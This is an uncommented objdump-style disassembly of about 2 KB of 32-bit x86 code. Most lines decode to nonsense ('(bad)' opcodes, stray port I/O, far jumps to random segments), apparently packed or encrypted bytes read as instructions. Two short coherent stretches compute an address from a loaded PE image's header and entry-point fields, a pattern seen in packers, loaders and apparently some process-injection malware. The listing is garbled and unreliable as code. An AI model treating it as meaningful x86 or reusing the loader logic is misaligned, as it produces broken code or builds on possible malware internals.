  41d7ea:	lock pop ebx
  41d7ec:	clc    
  41d7ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7ee:	jns    0x41d7a7
  41d7f0:	cmp    BYTE PTR [esi-0x2b351a39],ch
  41d7f6:	into   
  41d7f7:	cld    
  41d7f8:	sbb    al,BYTE PTR [esi]
  41d7fa:	pushf  
  41d7fb:	push   0xffffff90
  41d7fd:	lods   al,BYTE PTR ds:[esi]
  41d7fe:	ja     0x41d851
  41d800:	in     eax,dx
  41d801:	and    eax,0xcfbb9332
  41d806:	mov    dl,0x7e
  41d808:	leave  
  41d809:	jbe    0x41d84f
  41d80b:	cwde   
  41d80c:	jns    0x41d844
  41d80e:	out    dx,al
  41d80f:	cli    
  41d810:	inc    edx
  41d811:	out    dx,al
  41d812:	loopne 0x41d807
  41d814:	adc    eax,0x7b43e91f
  41d819:	pop    DWORD PTR [ecx+ecx*4]
  41d81c:	test   eax,0x69b4b5aa
  41d821:	jecxz  0x41d7bf
  41d823:	pusha  
  41d824:	arpl   WORD PTR [ebx],si
  41d826:	lods   al,BYTE PTR ds:[esi]
  41d827:	jne    0x41d882
  41d829:	mov    edi,0x2c2eed75
  41d82e:	outs   dx,BYTE PTR ds:[esi]
  41d82f:	arpl   WORD PTR [esi-0x4498695],bp
  41d835:	popa   
  41d836:	das    
  41d837:	sar    BYTE PTR [edx-0x16462733],0xd6
  41d83e:	mov    ds:0x1777db79,eax
  41d843:	cdq    
  41d844:	(bad)  
  41d845:	push   ebx
  41d846:	and    ch,BYTE PTR [esi+0x47ea2580]
  41d84c:	leave  
  41d84d:	in     eax,0x2a
  41d84f:	ds mov ecx,0x6343a1c7
  41d855:	cmp    eax,0xa54c13eb
  41d85a:	jle    0x41d8cd
  41d85c:	or     esi,DWORD PTR [bp+di-0xc]
  41d860:	mov    bh,0x6a
  41d862:	ret    
  41d863:	jecxz  0x41d8cd
  41d865:	cli    
  41d866:	inc    edi
  41d867:	js     0x41d83d
  41d869:	call   FWORD PTR [ebp+eiz*1+0x32]
  41d86d:	ret    0xfa21
  41d870:	mov    al,0x36
  41d872:	xchg   ebp,eax
  41d873:	sub    esi,DWORD PTR [edx-0x2a]
  41d876:	mov    cl,0x19
  41d878:	sti    
  41d879:	(bad)  
  41d87b:	aam    0xc5
  41d87d:	pop    esi
  41d87e:	sbb    eax,0xcf816b55
  41d883:	retf   0xe03e
  41d886:	aam    0xb0
  41d888:	repnz sahf 
  41d88a:	cld    
  41d88b:	add    cl,dh
  41d88d:	lock and cl,BYTE PTR [eax]
  41d890:	sub    al,0x26
  41d892:	mov    bl,0x48
  41d894:	push   eax
  41d895:	in     eax,dx
  41d896:	fcmovnu st,st(3)
  41d898:	pop    ebx
  41d899:	push   eax
  41d89a:	xor    DWORD PTR [ebx],esi
  41d89c:	nop
  41d89d:	cmp    eax,0xc370e0
  41d8a2:	mov    bl,0xd7
  41d8a4:	jmp    0x41d920
  41d8a6:	xchg   esi,eax
  41d8a7:	cdq    
  41d8a8:	sbb    eax,0x4f41bdd1
  41d8ad:	out    dx,al
  41d8ae:	loopne 0x41d8e4
  41d8b0:	push   cs
  41d8b1:	dec    eax
  41d8b2:	sub    DWORD PTR [eax],eax
  41d8b4:	sbb    al,0x18
  41d8b6:	stos   BYTE PTR es:[edi],al
  41d8b7:	scas   al,BYTE PTR es:[edi]
  41d8b8:	rol    DWORD PTR [esi+eax*4],1
  41d8bb:	sub    al,0x60
  41d8bd:	fimul  WORD PTR [edx+0x7966fd2a]
  41d8c3:	or     eax,0xd8740d71
  41d8c9:	adc    ebx,DWORD PTR [eax-0x9]
  41d8cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8cd:	(bad)  
  41d8ce:	rcr    BYTE PTR [edx-0x4200253e],cl
  41d8d4:	jne    0x41d930
  41d8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8d7:	out    0x89,al
  41d8d9:	call   0xe140:0xe01f2628
  41d8e0:	dec    bx
  41d8e2:	nop
  41d8e3:	sbb    bl,BYTE PTR [ebp-0x4a909343]
  41d8e9:	scas   al,BYTE PTR es:[edi]
  41d8ea:	push   0xc1684b6a
  41d8ef:	sbb    ch,dh
  41d8f1:	stc    
  41d8f2:	xchg   DWORD PTR [edx+edi*2-0x64],edi
  41d8f6:	cmp    esp,DWORD PTR [ecx]
  41d8f8:	je     0x41d916
  41d8fa:	sbb    eax,0xffffffcd
  41d8fd:	jbe    0x41d917
  41d8ff:	pushf  
  41d900:	sub    DWORD PTR [edi-0x7e],edx
  41d903:	cmp    ecx,DWORD PTR [ecx+0x7f]
  41d906:	cmp    eax,edx
  41d908:	mov    edx,DWORD PTR [esp+0x18]
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422598
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x6370bdbc,eax
  41d941:	mov    esp,0x18164d7f
  41d946:	mov    esp,0xf0181812
  41d94b:	jl     0x41d994
  41d94d:	fbstp  TBYTE PTR [eax]
  41d94f:	jns    0x41d8e6
  41d951:	das    
  41d952:	in     al,dx
  41d953:	shr    DWORD PTR [eax],cl
  41d955:	xor    al,0x66
  41d957:	mov    eax,ds:0x48218e9
  41d95c:	push   esp
  41d95d:	pop    ds
  41d95e:	mov    bl,0xfb
  41d960:	xchg   ebx,eax
  41d961:	inc    esp
  41d962:	mov    eax,ebx
  41d964:	sub    eax,0x91a0daba
  41d969:	pop    ds
  41d96a:	adc    al,0x6a
  41d96c:	add    eax,0x88d5844b
  41d971:	dec    edx
  41d972:	mov    ecx,0xa5153a9e
  41d977:	push   ecx
  41d978:	cmp    DWORD PTR [ecx-0x6f07ae5],ebx
  41d97e:	and    al,0x94
  41d980:	push   0x66
  41d982:	test   eax,0x3cb70e64
  41d987:	popf   
  41d988:	jnp    0x41d9ac
  41d98a:	lds    edx,FWORD PTR [eax+0x714b88ea]
  41d990:	jbe    0x41d9bb
  41d992:	retf   
  41d993:	pop    ss
  41d994:	cmp    al,0xdf
  41d996:	xchg   ebx,eax
  41d997:	fst    DWORD PTR [ebp-0x56f6f0a3]
  41d99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99e:	lods   eax,DWORD PTR ds:[esi]
  41d99f:	add    al,0x6
  41d9a1:	retf   0x3aa6
  41d9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9a5:	aad    0xd8
  41d9a7:	jns    0x41d961
  41d9a9:	jae    0x41d9a6
  41d9ab:	clc    
  41d9ac:	call   0x8dc80c5b
  41d9b1:	push   ecx
  41d9b2:	push   ebx
  41d9b3:	sahf   
  41d9b4:	mov    edi,0xf9cd7c52
  41d9b9:	mov    ds:0x4d86de7d,eax
  41d9be:	arpl   ax,si
  41d9c0:	popa   
  41d9c1:	inc    edx
  41d9c2:	popf   
  41d9c3:	in     al,0x77
  41d9c5:	and    dl,BYTE PTR [edi-0x43870d6e]
  41d9cb:	sub    DWORD PTR [edx-0x63],ebp
  41d9ce:	mov    dh,0xd9
  41d9d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d2:	repnz shl ch,cl
  41d9d5:	mov    dl,dh
  41d9d7:	in     eax,0xb8
  41d9d9:	xor    bl,BYTE PTR [ebx+0x75]
  41d9dc:	add    al,bl
  41d9de:	inc    ebp
  41d9df:	mov    al,0xa
  41d9e1:	retf   0xb3b
  41d9e4:	push   eax
  41d9e5:	mov    ds:0x406dcd47,eax
  41d9ea:	cmp    cl,BYTE PTR [ebx-0x4af31928]
  41d9f0:	pop    ebp
  41d9f1:	aas    
  41d9f2:	inc    ebx
  41d9f3:	bound  edx,QWORD PTR [eax+0x25bace3a]
  41d9f9:	adc    DWORD PTR [edx-0x52f4bc0a],ecx
  41d9ff:	fidivr WORD PTR [ebx+0xdb17235]
  41da05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da06:	bound  esp,QWORD PTR [edx+0x2f]
  41da09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da0a:	mov    ebx,0xde99c62d
  41da0f:	jl     0x41da4d
  41da11:	retf   
  41da12:	scas   eax,DWORD PTR es:[edi]
  41da13:	add    ah,BYTE PTR [esi]
  41da15:	adc    eax,0xadff1c12
  41da1a:	adc    al,0xef
  41da1c:	dec    esi
  41da1d:	ror    DWORD PTR [edx-0x45],0xfc
  41da21:	gs jo  0x41d9ac
  41da24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da25:	in     al,0x83
  41da27:	sub    DWORD PTR [esi],esi
  41da29:	js     0x41da26
  41da2b:	aam    0xee
  41da2d:	xor    eax,0xb28b19f2
  41da32:	pop    esi
  41da33:	or     eax,0xa7f36036
  41da38:	(bad)  
  41da39:	mov    ebx,0x801aa17d
  41da3e:	sub    cl,BYTE PTR [ebx+0x3eaa3f3e]
  41da44:	mov    ah,0xa2
  41da46:	test   eax,0x2c849bec
  41da4b:	inc    eax
  41da4c:	xor    eax,0xec0c541
  41da51:	jbe    0x41d9ed
  41da53:	mov    dh,0x40
  41da55:	imul   esp,DWORD PTR [ebx+0x38c1abb4],0xb02ab023
  41da5f:	cmp    cl,BYTE PTR [edi-0x71]
  41da62:	mov    ecx,0xa36271d8
  41da67:	shl    DWORD PTR [esi+0x3f],1
  41da6a:	lock jb 0x41dad2
  41da6d:	jne    0x41dac7
  41da6f:	cmp    eax,0xba82835a
  41da74:	jp     0x41daaa
  41da76:	icebp  
  41da77:	ficomp WORD PTR [edi]
  41da79:	or     ebx,DWORD PTR ds:0xe655f3ac
  41da7f:	xchg   ebp,eax
  41da80:	loopne 0x41dacb
  41da82:	mov    ds:0xee206776,al
  41da87:	outs   dx,DWORD PTR ds:[esi]
  41da88:	mov    edi,0xfe982800
  41da8d:	push   edx
  41da8e:	push   cs
  41da8f:	mov    edx,0xc610f519
  41da94:	iret   
  41da95:	fdiv   QWORD PTR ds:0x96fba8f0
  41da9b:	cmp    dh,BYTE PTR [ebx-0x47]
  41da9e:	lods   eax,DWORD PTR ds:[esi]
  41da9f:	pop    esp
  41daa0:	out    dx,eax
  41daa1:	test   BYTE PTR [edi-0x712c186d],ch
  41daa7:	dec    ebx
  41daa8:	fidivr DWORD PTR [eax+0x35]
  41daab:	and    dh,bl
  41daad:	nop
  41daae:	call   0xe293:0x423d80c3
  41dab5:	int    0xa2
  41dab7:	pop    ds
  41dab8:	shl    BYTE PTR [edi-0x7e55ccb],cl
  41dabe:	in     al,dx
  41dabf:	mov    ecx,0x42d7ef6c
  41dac4:	repz inc edx
  41dac6:	and    edx,ebx
  41dac8:	mov    eax,ds:0xca63646e
  41dacd:	mov    eax,0xd69491d1
  41dad2:	aaa    
  41dad3:	xchg   esi,eax
  41dad4:	sub    BYTE PTR [esi+0x49dac857],al
  41dada:	mov    al,cs:0xb06b5cc5
  41dae0:	or     DWORD PTR [ebx+eax*8],ebx
  41dae3:	mov    ebp,DWORD PTR [ebp+0x1b81947e]
  41dae9:	adc    al,0x3
  41daeb:	inc    edi
  41daec:	mov    dh,0x4f
  41daee:	add    BYTE PTR [ebp+0x6bd6f996],0x82
  41daf5:	loopne 0x41db3f
  41daf7:	mov    bh,al
  41daf9:	adc    DWORD PTR [ebp+0x6d],ecx
  41dafc:	sub    DWORD PTR [ebx],0xf1b85741
  41db02:	js     0x41daf1
  41db04:	mov    edx,0x8d47a36e
  41db09:	cld    
  41db0a:	(bad)  
  41db0b:	cmc    
  41db0c:	mov    BYTE PTR [edx-0x5b2309d4],0xdc
  41db13:	dec    ecx
  41db14:	dec    esi
  41db15:	bound  ebp,QWORD PTR [ebp+0x677474b2]
  41db1b:	or     DWORD PTR [eax+0x72],edx
  41db1e:	loope  0x41daa1
  41db20:	inc    ecx
  41db21:	push   cs
  41db22:	fidivr WORD PTR [eax]
  41db24:	xchg   ebx,eax
  41db25:	xor    eax,0xd15228d
  41db2a:	xchg   esi,eax
  41db2b:	add    ebp,DWORD PTR [eax+0x56a3cd72]
  41db31:	in     eax,dx
  41db32:	xor    DWORD PTR [ebx+0x44],ecx
  41db35:	data16 clc 
  41db37:	cmc    
  41db38:	dec    esp
  41db39:	ret    0x16e6
  41db3c:	data16 (bad) 
  41db3e:	lods   al,BYTE PTR ds:[esi]
  41db3f:	or     DWORD PTR [edi+ebp*8],0x5e0774c2
  41db46:	or     edx,edx
  41db48:	mov    eax,ds:0xa50f0fc8
  41db4d:	scas   eax,DWORD PTR es:[edi]
  41db4e:	dec    esp
  41db4f:	sbb    eax,0x9b54f193
  41db54:	outs   dx,DWORD PTR ds:[esi]
  41db55:	jno    0x41dafd
  41db57:	xor    al,0x4f
  41db59:	sbb    BYTE PTR [eax+0x1b15d0e],dl
  41db5f:	jbe    0x41db5f
  41db61:	sub    dh,BYTE PTR [eax+ebx*2+0x9]
  41db65:	xchg   edi,eax
  41db66:	mov    DWORD PTR [ebx+0x7c],esi
  41db69:	add    BYTE PTR [edi+0x69813669],ah
  41db6f:	push   edx
  41db70:	das    
  41db71:	cli    
  41db72:	and    al,0x6c
  41db74:	add    dh,ch
  41db76:	gs push ebx
  41db78:	hlt    
  41db79:	jge    0x41db18
  41db7b:	xchg   ch,dl
  41db7d:	popa   
  41db7e:	iret   
  41db7f:	and    DWORD PTR [ebx-0x5b],edx
  41db82:	jae    0x41dbe0
  41db84:	(bad)  
  41db85:	int3   
  41db86:	add    al,0xe2
  41db88:	xor    dl,BYTE PTR [esi-0x434a21ff]
  41db8e:	push   0x3a
  41db90:	icebp  
  41db91:	pop    esi
  41db92:	popf   
  41db93:	inc    ebp
  41db94:	(bad)  
  41db95:	push   ds
  41db96:	xor    esi,DWORD PTR [eax+ebp*4]
  41db99:	mov    ds:0xc78b0ed4,eax
  41db9e:	dec    BYTE PTR [ecx+0x3db5975d]
  41dba4:	pop    eax
  41dba5:	sbb    esi,DWORD PTR [ecx]
  41dba7:	rcr    DWORD PTR [eax],cl
  41dba9:	jmp    0x9f6796bb
  41dbae:	jne    0x41dbcd
  41dbb0:	pop    edx
  41dbb1:	inc    ecx
  41dbb2:	stc    
  41dbb3:	push   edi
  41dbb4:	push   esp
  41dbb5:	call   0x76c:0x975cf8b4
  41dbbc:	pinsrw mm7,WORD PTR [esi-0x15],0xb1
  41dbc1:	dec    esp
  41dbc2:	dec    eax
  41dbc3:	(bad)  
  41dbc4:	lea    ecx,[ebx-0x38576b47]
  41dbca:	jg     0x41db9e
  41dbcc:	ins    DWORD PTR es:[edi],dx
  41dbcd:	inc    esp
  41dbce:	test   eax,0x4752a7cb
  41dbd3:	adc    eax,0x69c9451b
  41dbd8:	jg     0x41db7b
  41dbda:	jg     0x41db62
  41dbdc:	imul   edi,DWORD PTR [edx+0x5edfa1e1],0xfffffffb
  41dbe3:	jl     0x41dc40
  41dbe5:	jmp    0x531d:0x82645cc0
  41dbec:	call   0x8ac6:0x2e8dbd79
  41dbf3:	bound  ecx,QWORD PTR ds:0x2a1777d7
  41dbf9:	dec    ebx
  41dbfa:	mov    WORD PTR [ecx],gs
  41dbfc:	pop    esp
  41dbfd:	inc    ecx
  41dbfe:	pop    edi
  41dbff:	test   eax,0x44e74407
  41dc04:	shr    DWORD PTR [esp+esi*8],cl
  41dc07:	fmul   st,st(7)
  41dc09:	cli    
  41dc0a:	leave  
  41dc0b:	cmp    DWORD PTR [ecx],edx
  41dc0d:	xchg   esi,eax
  41dc0e:	sahf   
  41dc0f:	out    0xe3,eax
  41dc11:	pop    ds
  41dc12:	and    eax,0x68c15a96
  41dc17:	lods   al,BYTE PTR ds:[esi]
  41dc18:	outs   dx,BYTE PTR ds:[esi]
  41dc19:	mov    eax,0xfb890e6b
  41dc1e:	fistp  WORD PTR [eax-0x4eb4034e]
  41dc24:	popa   
  41dc25:	loopne 0x41dbe7
  41dc27:	jbe    0x41dc4e
  41dc29:	inc    esp
  41dc2a:	push   edx
  41dc2b:	(bad)  
  41dc2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc2d:	sbb    bh,BYTE PTR [ebp+0x1a81137b]
  41dc33:	cli    
  41dc34:	add    cl,BYTE PTR [eax+eiz*1+0x2566ddcc]
  41dc3b:	arpl   WORD PTR [ecx-0xb6871a2],di
  41dc41:	add    esp,DWORD PTR [eax-0x72]
  41dc44:	sub    al,0x14
  41dc46:	xchg   esi,eax
  41dc47:	jb     0x41dca2
  41dc49:	and    eax,0xc21f109b
  41dc4e:	adc    ecx,DWORD PTR [esi]
  41dc50:	pop    edx
  41dc51:	cli    
  41dc52:	loope  0x41dcc6
  41dc54:	push   0xb29e20f1
  41dc59:	cmp    eax,0xd2643987
  41dc5e:	ror    bh,cl
  41dc60:	mov    ds:0x909e2df7,eax
  41dc65:	inc    esi
  41dc66:	in     eax,dx
  41dc67:	sti    
  41dc68:	fwait
  41dc69:	adc    bl,dl
  41dc6b:	sahf   
  41dc6c:	cmp    al,0x76
  41dc6e:	or     eax,0xefa749a8
  41dc73:	mov    eax,0x2f814fd6
  41dc78:	(bad)  [ecx+0x18]
  41dc7b:	les    edx,FWORD PTR [edi+0x5d8c181e]
  41dc81:	xchg   esp,eax
  41dc82:	inc    edi
  41dc83:	adc    al,0x97
  41dc85:	scas   eax,DWORD PTR es:[edi]
  41dc86:	pop    ebx
  41dc87:	test   BYTE PTR [ebx],al
  41dc89:	or     bl,dh
  41dc8b:	cmp    eax,0x1183ca55
  41dc90:	xchg   edi,eax
  41dc91:	pop    eax
  41dc92:	and    al,0x86
  41dc94:	add    ebp,DWORD PTR [esi+ebp*1-0x51329f36]
  41dc9b:	icebp  
  41dc9c:	inc    ebx
  41dc9d:	nop
  41dc9e:	mov    es,esp
  41dca0:	xor    edx,ecx
  41dca2:	push   esi
  41dca3:	repnz loopne 0x41dc45
  41dca6:	and    BYTE PTR [ecx-0x5878da25],cl
  41dcac:	push   eax
  41dcad:	xchg   ebx,eax
  41dcae:	jmp    0xa396:0xdeb69979
  41dcb5:	push   ebx
  41dcb6:	jle    0x41dc8c
  41dcb8:	mov    bh,0xff
  41dcba:	mov    ds,esp
  41dcbc:	aaa    
  41dcbd:	jmp    0x9ac10159
  41dcc2:	jl     0x41dcc7
  41dcc4:	inc    esi
  41dcc5:	fdivr  QWORD PTR [esi+0x6f9c95f7]
  41dccb:	daa    
  41dccc:	test   al,0x3c
  41dcce:	std    
  41dccf:	icebp  
  41dcd0:	repnz int3 
  41dcd2:	bound  ecx,QWORD PTR [ebx+0x3364ffe2]
  41dcd8:	adc    al,BYTE PTR [ecx+0x3355b0da]
  41dcde:	sbb    DWORD PTR [edi+0x3728899b],esi
  41dce4:	loop   0x41dd4e
  41dce6:	sub    al,0xff
  41dce8:	xchg   edi,eax
  41dce9:	imul   ecx,DWORD PTR [edx+0x3e936c56],0xffffffea
  41dcf0:	xchg   esp,eax
  41dcf1:	sbb    bh,BYTE PTR [esp+edi*4]
  41dcf4:	ficom  WORD PTR [ebx+eiz*8-0x23aae06d]
  41dcfb:	xchg   ebx,eax
  41dcfc:	lea    eax,[esp+0x6c]
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x38
  41dd5b:	(bad)  
  41dd5c:	xor    eax,0x1647226a
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x18c0e7e8],bh
  41dd68:	and    BYTE PTR [esi],0x5
  41dd6b:	mov    ds:0x7eb0a14b,eax
  41dd70:	jmp    0x41dd55
  41dd72:	lock gs push cs
  41dd75:	test   al,0xa7
  41dd77:	xor    al,0xbc
  41dd79:	push   cs
  41dd7a:	leave  
  41dd7b:	repz xchg ebp,eax
  41dd7d:	mov    ebx,0xe4cc85fd
  41dd82:	add    BYTE PTR [edx+eiz*2],0xe0
  41dd86:	div    BYTE PTR [ecx-0x72]
  41dd89:	dec    ecx
  41dd8a:	mov    ch,0xbd
  41dd8c:	push   ds
  41dd8d:	popf   
  41dd8e:	mov    cl,0x93
  41dd90:	sbb    bl,ah
  41dd92:	jns    0x41dddb
  41dd94:	dec    esp
  41dd95:	(bad)  
  41dd96:	js     0x41ddab
  41dd98:	test   DWORD PTR [edi-0x22],0x9796a383
  41dd9f:	lock test eax,0xcc9a9d39
  41dda5:	push   0x812e660
  41ddaa:	std    
  41ddab:	ja     0x41ddea
  41ddad:	pushf  
  41ddae:	(bad)  
  41ddaf:	stos   DWORD PTR es:[edi],eax
  41ddb0:	cmp    DWORD PTR [edi-0x7a3f2aeb],esi
  41ddb6:	adc    BYTE PTR [edi+ebx*4+0x18],ah
  41ddba:	add    esp,DWORD PTR [ecx-0x744683c5]
  41ddc0:	xchg   esp,eax
  41ddc1:	shl    edi,0x8e
  41ddc4:	sbb    eax,0xd2f3343e
  41ddc9:	dec    esp
  41ddca:	push   0x3e931b30
  41ddcf:	mov    bl,0x45
  41ddd1:	hlt    
  41ddd2:	dec    ebx
  41ddd3:	imul   eax,DWORD PTR [ecx],0xffffff9e
  41ddd6:	and    eax,0x197f0035
  41dddb:	dec    ecx
  41dddc:	test   eax,0x44a8b978
  41dde1:	xor    DWORD PTR [esi],edx
  41dde3:	js     0x41dd8e
  41dde5:	add    al,0x37
  41dde7:	mov    esp,0x46d15ecf
  41ddec:	inc    edi
  41dded:	add    eax,0x5030222d
  41ddf2:	mov    eax,ds:0xc82e3dca
  41ddf7:	inc    ebp
  41ddf8:	mov    ecx,0x1e597f5f
  41ddfd:	jle    0x41dda1
  41ddff:	push   edi
  41de00:	and    al,0x43
  41de02:	mov    esi,0x65a14b07
  41de07:	mov    ah,0x2
  41de09:	aam    0xda
  41de0b:	mov    ebx,0x23577b22
  41de10:	xor    eax,0x400f14c0
  41de15:	jo     0x41de4e
  41de17:	mov    ebp,0xf6b02905
  41de1c:	(bad)  
  41de1d:	scas   al,BYTE PTR es:[edi]
  41de1e:	inc    edi
  41de1f:	fldcw  WORD PTR [ebx]
  41de21:	pushf  
  41de22:	or     ebp,esi
  41de24:	push   edx
  41de25:	sub    ecx,ebx
  41de27:	(bad)  
  41de28:	jmp    0x23cf:0x3b951bb6
  41de2f:	nop
  41de30:	mov    ah,0x18
  41de32:	test   DWORD PTR [edx+edx*1+0x15ba27a4],0xdf824388
  41de3d:	sbb    bl,cl
  41de3f:	pop    es
  41de40:	inc    edi
  41de41:	push   esp
  41de42:	out    dx,al
  41de43:	jg     0x41dddb
  41de45:	xchg   esp,eax
  41de46:	mov    al,0xb6
  41de48:	outs   dx,BYTE PTR ds:[esi]
  41de49:	mov    eax,0xf6b4f5e2
  41de4e:	inc    ecx
  41de4f:	sbb    bh,dh
  41de51:	mov    edi,0xd9542126
  41de56:	ret    0x5664
  41de59:	scas   al,BYTE PTR es:[edi]
  41de5a:	sti    
  41de5b:	mov    ch,0x26
  41de5d:	arpl   WORD PTR [ebx-0x4c],bp
  41de60:	jmp    0x41ddeb
  41de62:	pushf  
  41de63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de64:	sub    DWORD PTR [ecx-0x2b],ebp
  41de67:	xor    dh,BYTE PTR [eax-0x3a09575d]
  41de6d:	(bad)  
  41de6e:	loop   0x41de5c
  41de70:	test   al,0x93
  41de72:	adc    eax,0xd44df3d7
  41de77:	xor    al,0xdc
  41de79:	inc    ebp
  41de7a:	xor    ecx,DWORD PTR [edi+0xf054295]
  41de80:	push   ebp
  41de81:	pop    bx
  41de83:	fdiv   DWORD PTR [ecx-0x10ab3ab0]
  41de89:	mov    DWORD PTR [eax],esi
  41de8b:	aad    0xa5
  41de8d:	add    al,0x5b
  41de8f:	les    esp,FWORD PTR ds:0xc556e994
  41de95:	stos   DWORD PTR es:[edi],eax
  41de96:	pop    eax
  41de97:	pusha  
  41de98:	outs   dx,BYTE PTR ds:[esi]
  41de99:	xor    cl,BYTE PTR [edi+0x4a]
  41de9c:	test   eax,0x17e3c22d
  41dea1:	lea    ebx,[ebx]
  41dea3:	xchg   esp,eax
  41dea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dea5:	cwde   
  41dea6:	jns    0x41de73
  41dea8:	repnz std 
  41deaa:	mov    ebx,0xcdb689ba
  41deaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deb0:	in     al,0x91
  41deb2:	in     al,dx
  41deb3:	lahf   
  41deb4:	dec    edi
  41deb5:	mov    eax,0x50bf7846
  41deba:	bound  edi,QWORD PTR [ecx]
  41debc:	dec    eax
  41debd:	pop    edx
  41debe:	push   0x4e61aff5
  41dec3:	mov    dh,0x9d
  41dec5:	add    al,0x56
  41dec7:	test   BYTE PTR [edx+0x12275200],dh
  41decd:	int    0x15
  41decf:	stos   DWORD PTR es:[edi],eax
  41ded0:	call   0x5eae993b
  41ded5:	int3   
  41ded6:	push   eax
  41ded7:	pop    es
  41ded8:	jmp    FWORD PTR [ebp-0x3c2c30b3]
  41dede:	mov    edi,0x8f85dd4c
  41dee3:	stos   BYTE PTR es:[edi],al
  41dee4:	or     eax,0x92723ca7
  41dee9:	pop    ebp
  41deea:	push   ds
  41deeb:	fstp   TBYTE PTR [ebx]
  41deed:	sub    BYTE PTR [eax-0x3c299a4d],cl
  41def3:	dec    esp
  41def4:	ins    DWORD PTR es:[edi],dx
  41def5:	mov    ds:0xca11a36a,al
  41defa:	mov    ds:0x90b28028,al
  41deff:	fwait
  41df00:	and    BYTE PTR [eax],al
  41df02:	daa    
  41df03:	clc    
  41df04:	das    
  41df05:	rcr    DWORD PTR [edx],1
  41df07:	cmp    al,0x19
  41df09:	mov    dl,0x6b
  41df0b:	mov    ecx,0x6748dfe9
  41df10:	jle    0x41df03
  41df12:	aad    0x75
  41df14:	or     edi,ebx
  41df16:	adc    edx,ebp
  41df18:	jb     0x41df98
  41df1a:	dec    ecx
  41df1b:	int    0xf4
  41df1d:	and    eax,0xf08313fe
  41df22:	scas   al,BYTE PTR es:[edi]
  41df23:	jns    0x41df10
  41df25:	mov    ds:0xc6d9c1a3,al
  41df2a:	fsubp  st(1),st
  41df2c:	mov    ds,esp
  41df2e:	xor    BYTE PTR [edx+0x4506e9dc],ch
  41df34:	ins    DWORD PTR es:[edi],dx
  41df35:	jl     0x41dfb5
  41df37:	cmp    eax,0xbe22c338
  41df3c:	sub    ebx,edx
  41df3e:	scas   al,BYTE PTR es:[edi]
  41df3f:	mov    WORD PTR [esp+edi*8],cs
  41df42:	and    BYTE PTR [eax+0x15a8f448],bl
  41df48:	in     eax,dx
  41df49:	test   DWORD PTR [ebx],edx
  41df4b:	iret   
  41df4c:	jle    0x41df3b
  41df4e:	mov    eax,ds:0x9dbf5b2
  41df53:	xchg   edx,eax
  41df54:	dec    ebx
  41df55:	scas   eax,DWORD PTR es:[edi]
  41df56:	push   ebx
  41df57:	out    0x91,eax
  41df59:	and    al,0x68
  41df5b:	jle    0x41df01
  41df5d:	inc    edx
  41df5e:	fs push ss
  41df60:	push   ebp
  41df61:	mov    ds:0x198a8382,eax
  41df66:	loope  0x41dfaa
  41df68:	mov    al,0x7c
  41df6a:	loop   0x41df33
  41df6c:	shl    esp,1
  41df6e:	shr    BYTE PTR [edi+0x19a2c348],0x90
  41df75:	jl     0x41dfba
  41df77:	call   0x5667:0x344f3882
  41df7e:	push   0x2697fb4b
  41df83:	pop    edx
  41df84:	push   edx
  41df85:	inc    dh
  41df87:	inc    ebp
  41df88:	cwde   
  41df89:	sub    esp,DWORD PTR [edi+0x65875461]
  41df8f:	lds    edx,FWORD PTR [edx+0x5a]
  41df92:	lock ins BYTE PTR es:[edi],dx
  41df94:	stos   BYTE PTR es:[edi],al
  41df95:	cmp    ah,BYTE PTR [edi]
  41df97:	and    bh,BYTE PTR ds:0x9622cdd0
  41df9d:	push   0x723f1af8
  41dfa2:	sbb    eax,0x9c86a54e
  41dfa7:	mov    ah,0xa0
  41dfa9:	and    esi,ecx
  41dfab:	dec    ebp
  41dfac:	hlt    
  41dfad:	pextrw edx,(bad),0xc5
  41dfaf:	push   esi
  41dfb0:	or     al,0xf3
  41dfb2:	mov    BYTE PTR [ecx],0xd9
  41dfb5:	add    esi,DWORD PTR [edi-0x3e997fed]
  41dfbb:	rcl    DWORD PTR [ecx-0x3b],cl
